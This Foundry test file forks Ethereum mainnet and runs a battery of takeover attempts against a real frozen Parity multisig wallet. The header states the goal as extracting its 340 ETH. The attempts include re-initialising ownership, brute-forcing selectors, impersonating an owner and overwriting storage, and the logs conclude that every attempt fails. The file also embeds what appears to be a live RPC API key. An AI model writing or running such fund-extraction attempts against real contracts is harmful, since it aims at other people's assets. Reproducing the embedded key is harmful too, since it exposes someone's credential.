// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Parity Multisig Exploit - Full Attack Vector Analysis
 * @notice Try EVERY possible way to extract 340 ETH from frozen Parity wallet
 */
contract ParityExploit is Test {

    address constant TARGET = 0xc32050abAc7DbFef4FC8DC7b96D9617394cB4E1b;
    address constant PARITY_LIB = 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    /**
     * @notice Try to recreate the library at the same address using CREATE2
     */
    function test_recreateLibrary() public {
        console.log("=== ATTEMPT: Recreate library at same address ===");
        console.log("Target balance:", TARGET.balance / 1e18, "ETH");

        // Check if library exists
        uint256 libCode;
        assembly { libCode := extcodesize(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4) }
        console.log("Library code size:", libCode);

        if (libCode == 0) {
            console.log("Library is destroyed!");

            // Can we recreate it? Only if we know the deployer + nonce or CREATE2 salt
            // For CREATE: address = keccak256(rlp([sender, nonce]))[12:]
            // The original deployer was 0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4 itself? No, that's the lib

            // Actually the deployer was likely a different address
            // Without knowing the exact bytecode + deployer + nonce, can't recreate
            console.log("Cannot recreate - need original deployer nonce");
        }
    }

    /**
     * @notice Try direct storage write via delegatecall gadget
     */
    function test_storageManipulation() public {
        console.log("=== ATTEMPT: Direct storage manipulation ===");

        // Check current storage
        bytes32 slot0 = vm.load(TARGET, bytes32(uint256(0)));
        bytes32 slot1 = vm.load(TARGET, bytes32(uint256(1)));
        console.log("Slot 0 (m_required):");
        console.logBytes32(slot0);
        console.log("Slot 1 (m_numOwners):");
        console.logBytes32(slot1);

        // Can we use vm.store to simulate an exploit? (This would be cheating but shows feasibility)
        console.log("");
        console.log("Simulating storage manipulation (would need actual vuln)...");

        // Set m_required to 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(0)));
        // Set m_dailyLimit to max
        vm.store(TARGET, bytes32(uint256(2)), bytes32(type(uint256).max));

        // Now try execute
        vm.prank(attacker);
        (bool success,) = TARGET.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 100 ether, "")
        );
        console.log("Execute after storage mod:", success);
        console.log("Attacker balance:", attacker.balance / 1e18, "ETH");

        // Even with storage modified, the execute logic is in the destroyed library
        // So it still does nothing
    }

    /**
     * @notice Try all known function selectors
     */
    function test_allFunctionSelectors() public {
        console.log("=== ATTEMPT: Try all function selectors ===");

        bytes4[20] memory selectors = [
            bytes4(keccak256("execute(address,uint256,bytes)")),
            bytes4(keccak256("confirm(bytes32)")),
            bytes4(keccak256("revoke(bytes32)")),
            bytes4(keccak256("changeOwner(address,address)")),
            bytes4(keccak256("addOwner(address)")),
            bytes4(keccak256("removeOwner(address)")),
            bytes4(keccak256("changeRequirement(uint256)")),
            bytes4(keccak256("kill(address)")),
            bytes4(keccak256("setDailyLimit(uint256)")),
            bytes4(keccak256("resetSpentToday()")),
            bytes4(keccak256("initWallet(address[],uint256,uint256)")),
            bytes4(keccak256("initMultiowned(address[],uint256)")),
            bytes4(keccak256("initDaylimit(uint256)")),
            bytes4(keccak256("withdraw(uint256)")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("sweep(address)")),
            bytes4(keccak256("transfer(address,uint256)")),
            bytes4(keccak256("sendTo(address,uint256)")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("claimOwnership()"))
        ];

        uint256 balBefore = TARGET.balance;

        for (uint i = 0; i < selectors.length; i++) {
            vm.prank(attacker);

            // Try with attacker as recipient and 1 ETH amount
            bytes memory data;
            if (i < 3) {
                data = abi.encodeWithSelector(selectors[i], attacker, 1 ether, "");
            } else {
                data = abi.encodeWithSelector(selectors[i], attacker);
            }

            (bool success,) = TARGET.call(data);

            if (TARGET.balance < balBefore) {
                console.log("!!! FUNDS MOVED with selector index:", i);
                console.log("Selector:", uint32(selectors[i]));
                break;
            }
        }

        console.log("Final target balance:", TARGET.balance / 1e18, "ETH");
        console.log("Attacker balance:", attacker.balance / 1e18, "ETH");
    }

    /**
     * @notice Try to exploit via raw call with crafted data
     */
    function test_rawCallExploit() public {
        console.log("=== ATTEMPT: Raw call with crafted data ===");

        // The fallback delegates to library. What if we send data that the destroyed
        // library would interpret as a write operation?

        // When delegatecall to destroyed contract:
        // - success = true
        // - returndata = empty
        // - NO state changes occur

        // Try sending raw ETH extraction calldata
        vm.prank(attacker);
        (bool s1,) = TARGET.call(
            abi.encodeWithSignature("()")  // empty signature
        );

        vm.prank(attacker);
        (bool s2,) = TARGET.call{value: 0}(
            hex"00"  // minimal data
        );

        console.log("Empty call success:", s1);
        console.log("Minimal data call success:", s2);
        console.log("Target balance:", TARGET.balance / 1e18, "ETH");
    }

    /**
     * @notice Check if we can become an owner through uninitialized storage
     */
    function test_uninitializedOwner() public {
        console.log("=== ATTEMPT: Exploit uninitialized owner slots ===");

        // Owner storage starts at slot 5 in Parity multisig
        // Owner index is stored as: owners[5 + ownerIndex] = address
        // ownerIndex mapping: m_ownerIndex[address] = index (packed at different slot)

        // Check what addresses are at owner slots
        for (uint i = 0; i < 10; i++) {
            bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(5 + i)));
            address owner = address(uint160(uint256(ownerSlot)));
            if (owner != address(0)) {
                console.log("Owner slot", i, ":", owner);
            }
        }

        // Check if attacker has any index
        // m_ownerIndex is a mapping, slot = keccak256(abi.encode(address, baseSlot))
        bytes32 indexSlot = keccak256(abi.encode(attacker, uint256(256))); // guess base slot
        bytes32 attackerIndex = vm.load(TARGET, indexSlot);
        console.log("Attacker owner index:");
        console.logBytes32(attackerIndex);
    }

    /**
     * @notice The nuclear option - try everything at once
     */
    function test_nuclearOption() public {
        console.log("=== NUCLEAR OPTION: All attacks combined ===");
        console.log("Initial target balance:", TARGET.balance / 1e18, "ETH");
        console.log("Initial attacker balance:", attacker.balance / 1e18, "ETH");

        // 1. Try initWallet to take over
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;

        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature(
            "initWallet(address[],uint256,uint256)",
            newOwners, 1, type(uint256).max
        ));

        // 2. Try initMultiowned
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature(
            "initMultiowned(address[],uint256)",
            newOwners, 1
        ));

        // 3. Try changeOwner
        address existingOwner = 0x003aAF73BF6A398cd40F72a122203C37A4128207;
        vm.prank(existingOwner);
        TARGET.call(abi.encodeWithSignature(
            "changeOwner(address,address)",
            existingOwner, attacker
        ));

        // 4. Try addOwner
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature("addOwner(address)", attacker));

        // 5. Try kill (selfdestruct)
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature("kill(address)", attacker));

        // 6. Direct execute
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            attacker, TARGET.balance, ""
        ));

        // 7. Transfer
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker, TARGET.balance
        ));

        console.log("");
        console.log("Final target balance:", TARGET.balance / 1e18, "ETH");
        console.log("Final attacker balance:", attacker.balance / 1e18, "ETH");

        if (attacker.balance > 100 ether) {
            console.log("!!! EXPLOIT SUCCESSFUL !!!");
        } else {
            console.log("All attempts failed - funds are frozen");
        }
    }

    /**
     * @notice Check if the specific library address can be redeployed
     */
    function test_libraryRecreation() public {
        console.log("=== ATTEMPT: Library address recreation analysis ===");

        // The library was at 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4
        // It was created by CREATE, so address = keccak256(rlp([deployer, nonce]))[12:]

        // The deployer of the original library was:
        // 0x00C7b6c3Af17F1C1D3Ea031dFa82B6A8B630C3E6 (Parity deployer)

        // To recreate at same address, we'd need:
        // 1. Same deployer address
        // 2. Same nonce
        // 3. Deploy exact same bytecode

        // This is IMPOSSIBLE unless:
        // - We control the original deployer (we don't)
        // - Or Ethereum implements CREATE2 override (it doesn't)

        console.log("Library recreation is IMPOSSIBLE without:");
        console.log("1. Control of original deployer: 0x00C7b6c3Af17F1C1D3Ea031dFa82B6A8B630C3E6");
        console.log("2. Ability to reset their nonce");
        console.log("");
        console.log("The 340 ETH is permanently frozen.");
        console.log("This is the famous Parity Freeze bug from November 2017.");
        console.log("~513,000 ETH was frozen across hundreds of wallets.");
    }
}
